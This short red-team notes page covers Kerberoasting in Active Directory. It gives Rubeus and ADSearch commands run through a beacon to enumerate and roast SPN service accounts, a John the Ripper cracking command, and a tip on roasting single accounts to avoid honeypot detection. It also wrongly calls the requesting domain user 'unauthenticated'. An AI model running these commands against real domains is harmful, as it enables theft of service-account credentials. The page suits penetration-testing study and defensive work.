# Kerberoasting

## Introduction

Kerberoasting is an attack technique that attempts to obtain a password hash of an Active Directory account that has a Service Principal Name (SPN).&#x20;

**How it works**: An unauthenticated domain user can request a Kerberos ticket for an SPN. The kerberos ticket is encrypted with the hash of the service account. Adversaries then work offline to crack the password hash.

## Rubeus

```sh
beacon> execute-assembly C:\Tools\Rubeus.exe kerberoast /simple /nowrap

[*] Total kerberoastable users : 3
<hashes will be here>
```

## Crack Passwords

```sh
$ john --format=krb5tgs --wordlist=wordlist mssql_svc
```

<mark style="color:red;">**Note**</mark>: some hash formats can incompatibility with john. &#x20;

Removing the SPN so it became: `$krb5tgs$23$*mssql_svc$dev.domain.lab*$6A9E[hash]` seemed to address the issue.

## Safer Method

<mark style="color:red;">**Note**</mark>: By default, Rubeus will roast every account that has an SPN. Honey Pot accounts can be configured that will catch these type of attacks.

### Enumerate SPN accounts

```bash
beacon> execute-assembly C:\Tools\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" 
--attributes cn,servicePrincipalName,samAccountName
```

### Rubeus /user

Roast an indiviual account with the /user parameter

```bash
beacon> execute-assembly C:\Tools\Rubeus.exe kerberoast /user:mssql_svc /nowrap
```
